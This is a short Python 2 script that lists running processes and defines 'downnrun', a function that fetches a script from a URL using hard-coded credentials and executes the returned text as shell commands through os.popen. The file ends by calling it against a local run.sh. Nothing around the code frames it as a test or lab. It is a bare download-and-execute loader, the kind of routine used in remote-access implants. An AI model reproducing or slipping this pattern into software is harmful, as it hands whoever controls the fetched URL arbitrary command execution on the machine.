import psutil,os,requests

def pids():
    """print a list of pids"""
    for line in psutil.process_iter():
        print line.pid,line.name()
    
def pids_search(word):
    """print a list of pids with a word"""
    for line in psutil.process_iter():
        if word in line.name():
            print line.pid,line.name()        

def comman(instr):
    resp = os.popen("ls -lah").read()
    print resp
    
def downnrun(url):
    r = requests.get(url, auth=('tuna', 'tuna'))
    if r.status_code == 200:
        data = r.text
        resp = os.popen(data).read()
        print resp
    elif r.status_code != 200:
        print "URL Error"
    

#pids()
#pids_search('hrome')

downnrun('http://127.0.0.1:8000/run.sh')
